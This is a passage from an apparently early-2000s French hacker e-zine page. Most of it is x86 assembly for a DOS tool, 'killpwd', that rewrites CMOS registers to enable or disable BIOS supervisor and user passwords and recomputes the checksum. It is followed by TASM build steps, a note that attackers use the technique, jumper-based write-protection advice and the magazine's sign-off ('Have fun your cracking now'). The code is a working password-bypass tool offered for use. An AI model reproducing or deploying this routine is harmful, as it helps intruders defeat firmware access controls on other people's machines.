Affiche le copyright ***<BR> lea dx, copyr<BR> call print_msg</FONT></P><P><FONT FACE="Verdana, Arial, Helvetica, sans-serif" SIZE="2"> 
call parse_cmdl</FONT></P><P><FONT FACE="Verdana, Arial, Helvetica, sans-serif" SIZE="2">	
cmp ax, 0000h //display password-info<BR> je pwd_info</FONT></P><P><FONT FACE="Verdana, Arial, Helvetica, sans-serif" SIZE="2"> 
cmp ax, 0002h //active le supervisor-passwordwd<BR> je pwd_superenable</FONT></P><P><FONT FACE="Verdana, Arial, Helvetica, sans-serif" SIZE="2"> 
cmp ax, 0001h //d&eacute;sactive le supervisor-passwordd<BR> je pwd_superdisable</FONT></P><P><FONT FACE="Verdana, Arial, Helvetica, sans-serif" SIZE="2"> 
cmp ax, 0003h //installe le password au niveau du syst&egrave;me<BR> je pwd_system</FONT></P><P><FONT FACE="Verdana, Arial, Helvetica, sans-serif" SIZE="2"> 
cmp ax, 0004h //set password to setup level<BR> je pwd_setup<BR> <BR> cmp ax, 
0006h // active l'user-password<BR> je pwd_userenable</FONT></P><P><FONT FACE="Verdana, Arial, Helvetica, sans-serif" SIZE="2"> 
cmp ax, 0005h // d&eacute;sactive l'user-password<BR> je pwd_userdisable</FONT></P><P><FONT FACE="Verdana, Arial, Helvetica, sans-serif" SIZE="2"> 
jmp helpscreen </FONT></P><P><FONT FACE="Verdana, Arial, Helvetica, sans-serif" SIZE="2">;*** 
display pwd-information ***<BR>pwd_info:<BR> call show_info<BR> jmp back2dos</FONT></P><P><FONT FACE="Verdana, Arial, Helvetica, sans-serif" SIZE="2">;*** 
Installation du password au niveau du setup ***<BR>pwd_setup:<BR> mov al, 11h 
// lit 11 h dans le CMOS-reg<BR> call read_CMOS<BR> and al, NOT 1 // installe 
le password au niveau du setup<BR> mov ah, al<BR> mov al, 11h // &eacute;crit 
11 h dans le CMOS-reg<BR> call write_CMOS<BR> call do_checksum</FONT></P><P><FONT FACE="Verdana, Arial, Helvetica, sans-serif" SIZE="2"> 
lea dx, pw_2<BR> call print_msg<BR> jmp back2dos</FONT></P><P><FONT FACE="Verdana, Arial, Helvetica, sans-serif" SIZE="2">;*** 
Installation du password au niveau du setup ***<BR>pwd_system:<BR> mov al, 11h<BR> 
call read_CMOS<BR> or al, 1 // installe le password au niveau du syst&egrave;me<BR> 
mov ah, al<BR> mov al, 11h<BR> call write_CMOS</FONT></P><P><FONT FACE="Verdana, Arial, Helvetica, sans-serif" SIZE="2"> 
call do_checksum<BR> <BR> lea dx, pw_1<BR> call print_msg<BR> jmp back2dos</FONT></P><P><FONT FACE="Verdana, Arial, Helvetica, sans-serif" SIZE="2">;*** 
Activation du supervisor-password du BIOS ***<BR>pwd_superenable:<BR> mov al, 
11h<BR> call read_CMOS<BR> or al, 2 // active le PWD-bit<BR> mov ah, al<BR> mov 
al, 11h<BR> call write_CMOS</FONT></P><P><FONT FACE="Verdana, Arial, Helvetica, sans-serif" SIZE="2"> 
call do_checksum // calcule le nouveau checksum du CMOS</FONT></P><P><FONT FACE="Verdana, Arial, Helvetica, sans-serif" SIZE="2"> 
lea dx, pw_4<BR> call print_msg<BR> jmp back2dos</FONT></P><P><FONT FACE="Verdana, Arial, Helvetica, sans-serif" SIZE="2">;*** 
D&eacute;sactivation du supervisor-password du BIOS ***<BR>pwd_superdisable:<BR>	
mov al, 11h<BR> call read_CMOS<BR> and al, NOT 2 // D&eacute;sactive le PWD-bit<BR>	
mov ah, al<BR> mov al, 11h<BR> call write_CMOS</FONT></P><P><FONT FACE="Verdana, Arial, Helvetica, sans-serif" SIZE="2"> 
call do_checksum</FONT></P><P><FONT FACE="Verdana, Arial, Helvetica, sans-serif" SIZE="2">	
lea dx, pw_3<BR> call print_msg<BR> jmp back2dos</FONT></P><P><FONT FACE="Verdana, Arial, Helvetica, sans-serif" SIZE="2">;*** 
DUMMY JUMP ***<BR>pwd_userdisable:<BR> jmp real_userdisable</FONT></P><P><FONT FACE="Verdana, Arial, Helvetica, sans-serif" SIZE="2">;*** 
Activation de l'user-password du BIOS ***<BR>pwd_userenable:<BR> mov al, 5eh // 
lit 5eh dans CMOS-reg<BR> call read_CMOS<BR> or al, 1 // active le PWD-bit<BR> 
mov ah, al<BR> mov al, 5eh // &eacute;crit 5eh dans CMOS-reg<BR> call write_CMOS</FONT></P><P><FONT FACE="Verdana, Arial, Helvetica, sans-serif" SIZE="2"> 
call do_checksum_ext // calcule du nouveau checksum du CMOS</FONT></P><P><FONT FACE="Verdana, Arial, Helvetica, sans-serif" SIZE="2"> 
lea dx, pw_6 <BR> call print_msg<BR> jmp back2dos</FONT></P><P><FONT FACE="Verdana, Arial, Helvetica, sans-serif" SIZE="2">;*** 
D&eacute;sactivation de l'user-password du BIOS ***<BR>real_userdisable:<BR> mov 
al, 5eh<BR> call read_CMOS<BR> and al, NOT 1 // d&eacute;sactive le PWD-bit<BR> 
mov ah, al<BR> mov al, 5eh<BR> call write_CMOS</FONT></P><P><FONT FACE="Verdana, Arial, Helvetica, sans-serif" SIZE="2"> 
call do_checksum_ext</FONT></P><P><FONT FACE="Verdana, Arial, Helvetica, sans-serif" SIZE="2"> 
lea dx, pw_5<BR> call print_msg<BR> jmp back2dos</FONT></P><P><FONT FACE="Verdana, Arial, Helvetica, sans-serif" SIZE="2">;*** 
affiche l'&eacute;cran d'aide ***<BR>helpscreen:<BR> lea dx, help // affiche l'&eacute;cran 
d'aide<BR> call print_msg<BR>; jmp back2dos</FONT></P><P><FONT FACE="Verdana, Arial, Helvetica, sans-serif" SIZE="2">back2dos:<BR>	
.exit 0 // retour &agrave; 2 dos</FONT></P><P><FONT FACE="Verdana, Arial, Helvetica, sans-serif" SIZE="2"> 
END start<BR>------------------</FONT></P><P><FONT SIZE="2" FACE="Verdana, Arial, Helvetica, sans-serif">Voil&agrave;. 
C'est tout. Comme vous le noterez, ce n'est pas du tout compliqu&eacute;, fallait 
juste y penser. L'essentiel est expliqu&eacute;. Il a &eacute;t&eacute; test&eacute; 
: il est tr&egrave;s fonctionnel. Tapez un mot de passe au pif et &ccedil;a fonctionne 
(&eacute;videmment, le magazine t moi ne sauront &ecirc;tre tenus responsables 
des d&eacute;g&acirc;ts &eacute;ventuellement caus&eacute; par l'utilisation d'un 
tel code, cela coule de source !!)</FONT></P><P><FONT SIZE="2" FACE="Verdana, Arial, Helvetica, sans-serif"> 
Pour le compiler, utilisez TASM (&ccedil;a se trouve tr&egrave;s bien sur le Net). 
Appelez le programme &quot;killpwd&quot; par exemple et tapez la commande<BR>tasm 
/m killpwd (pour tasm v.4.0). Cette routine pourrait tr&egrave;s bien servir de 
sous-programme pour un futur logiciel plus &eacute;volu&eacute;.<BR> Avec un tel 
programme, si vous devenez amn&eacute;sique, vous pourrez d&eacute;j&agrave; sauver 
votre machine. Malheureusement, cette technique est utilis&eacute; &eacute;galement 
par les pirates afin de prendre le contr&ocirc;le d'un ordinateur. Face &agrave; 
cela, une seule parade existe, d&eacute;finitive : enclencher le cavalier derri&egrave;re 
sur votre carte-m&egrave;re (regardez votre mode d'emploi) afin de prot&eacute;g&eacute; 
votre BiOS en &eacute;criture. Non seulement, il ne sera jamais modifier ou flasher, 
mais encore vous serez pr&eacute;venu lors d'une telle tentative, ce qui aura 
pour effet de d&eacute;masquer le virus furtif.</FONT></P><P><FONT SIZE="2" FACE="Verdana, Arial, Helvetica, sans-serif"><BR>Have 
fun your cracking now :::&gt;</FONT></P><P> </P><P></P><P></P><P></P><P></P><P></P><P></P><P></P><P><FONT FACE="Verdana, Arial, Helvetica, sans-serif" SIZE="2"><BR>===================================================================== 
<BR></FONT></P><P><FONT FACE="Verdana, Arial, Helvetica, sans-serif" SIZE="2"><BR>Voil&agrave; 
ce premier num&eacute;ro touche &agrave; sa fin. J'esp&egrave;re qu'il vous a 
plu dans son id&eacute;ologie (m&ecirc;me si les premiers articles <BR>n'est gu&egrave;re 
d'un bon niveau!!) Toutes nos d&eacute;couvertes seront uniquement pour vous !! 
<BR>Merci de votre fid&eacute;lit&eacute;, de la pub que vous nous faites... c'est 
vous qui faites vivre notre site et ce magazine! <BR>Je ne sais pas encore quand 
le prochain magazine sortira... mais dans peu de temps! Une seule solution pour 
&ecirc;tre au <BR>courant : inscrivez-vous sur notre forum qui vous pr&eacute;viendra 
&agrave; chaque sortie de num&eacute;ro! On est en train de mettre au<BR>point 
une mailing-list. </FONT></P><P><FONT FACE="Verdana, Arial, Helvetica, sans-serif" SIZE="2">Bon, 
sur ce, je termienrai par ce po&egrave;me d'un hacker anonyme : </FONT></P><P><FONT FACE="Verdana, Arial, Helvetica, sans-serif" SIZE="2"><BR><FONT COLOR="#00CC00" SIZE="1">010110100111 
<BR>101010100100 <BR>100011010111 <BR>110010101000 </FONT></FONT></P><P><FONT FACE="Verdana, Arial, Helvetica, sans-serif" SIZE="1" COLOR="#00CC00">100010101111 
<BR>100010101110 <BR>001011011011 <BR>101100110010 </FONT></P><P><FONT FACE="Verdana, Arial, Helvetica, sans-serif" SIZE="1" COLOR="#00CC00">101101010010 
<BR>010101011010 <BR>010111010011 </FONT></P><P><FONT FACE="Verdana, Arial, Helvetica, sans-serif" SIZE="1" COLOR="#00CC00">101001010111 
<BR>010101001111 <BR>111010010111 </FONT></P><P ALIGN="CENTER"><FONT FACE="Verdana, Arial, Helvetica, sans-serif" SIZE="2"> 
</FONT></P><P ALIGN="CENTER"><FONT FACE="Verdana, Arial, Helvetica, sans-serif" SIZE="2">Visitez 
nos sites : <A HREF="http://dealer-hack.ifrance.com" TARGET="_blank">http://dealer-hack.ifrance.com</A> 
&amp; <A HREF="http://dealerhacksecurity.free.fr" TARGET="_blank">http://dealerhacksecurity.free.fr</A></FONT></P><P ALIGN="CENTER"><FONT FACE="Verdana, Arial, Helvetica, sans-serif" SIZE="2">Vous 
avez des questions a prepos du mag ? vous n'avez pas compris qq chose allez sur 
le forum : <A HREF="http://dealerhacksecurity.free.fr/forum" TARGET="_blank">http://dealerhacksecurity.free.fr/forum</A><BR></FONT></P><P ALIGN="CENTER"><FONT FACE="Verdana, Arial, Helvetica, sans-serif" SIZE="2"><B>By</B></FONT> 
<B><FONT FACE="Verdana, Arial, Helvetica, sans-serif" SIZE="2">TDC - The Darkunderground 
Clan</FONT></B><FONT FACE="Verdana, Arial, Helvetica, sans-serif" SIZE="2"> </FONT></P>
</BODY>
</HTML>
